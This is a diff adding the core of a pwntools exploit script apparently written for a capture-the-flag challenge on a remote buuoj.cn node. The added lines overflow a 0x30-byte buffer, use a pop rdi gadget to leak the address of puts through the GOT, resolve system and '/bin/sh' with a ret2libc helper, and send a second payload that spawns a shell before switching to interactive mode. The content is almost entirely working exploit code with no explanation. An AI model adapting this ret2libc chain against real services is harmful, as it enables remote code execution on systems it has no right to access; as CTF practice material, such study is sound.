@@ -29,7 +29,19 @@ elf = ELF(binary)
 p = remote('node3.buuoj.cn',28423) if argv[1]=='r' else process(binary)
 
 # start
+pop_rdi = 0x400a43
+hellow = 0x400a68
 
+ru('begin\n')
+payload = flat('a'*0x30,hellow,'Hellow ,','a'*8,pop_rdi,elf.got['puts'],elf.plt['puts'],elf.sym['main'])
+sl(payload)
+
+puts = uu64(r(6))
+leak('puts',puts)
+system, binsh = ret2libc(puts, 'puts')
+ru('begin\n')
+payload = flat('a'*0x30,hellow,'Hellow ,','a'*8,pop_rdi,binsh,system)
+sl(payload)
 # end
 
 itr()
